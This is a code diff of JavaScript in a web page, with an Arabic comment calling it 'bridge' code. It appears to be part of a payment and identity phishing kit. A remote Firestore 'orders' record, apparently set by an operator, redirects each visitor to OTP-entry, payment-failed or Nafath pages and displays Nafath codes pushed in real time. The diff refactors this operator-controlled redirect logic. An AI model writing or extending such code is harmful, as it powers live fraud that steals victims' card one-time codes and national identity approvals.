@@ -167,32 +167,26 @@
                 }
             }
         });
-    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
-    if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_faild.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    const codeBox = document.getElementById('nafath-number');
-                    if (codeBox && data.nafath_code) {
-                        codeBox.innerText = data.nafath_code;
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) overlay.style.display = 'none';
-                    }
+
+        onSnapshot(doc(db, "orders", userId), (orderSnap) => {
+            const data = orderSnap.data();
+            if (!data) return;
+            if (data.next_step === "GO_TO_OTP") {
+                window.location.href = "otp_verification.html";
+            } else if (data.next_step === "GO_TO_REJECT") {
+                window.location.href = "payment_failed.html";
+            } else if (data.next_step === "GO_TO_NAFATH") {
+                window.location.href = "nafath.html";
+            } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                const codeBox = document.getElementById('nafath-number');
+                if (codeBox && data.nafath_code) {
+                    codeBox.innerText = data.nafath_code;
+                    const overlay = document.getElementById('overlay');
+                    if (overlay) overlay.style.display = 'none';
                 }
             }
         });
     }
-})();
-// ------------------------------------------
 
 </script>
 
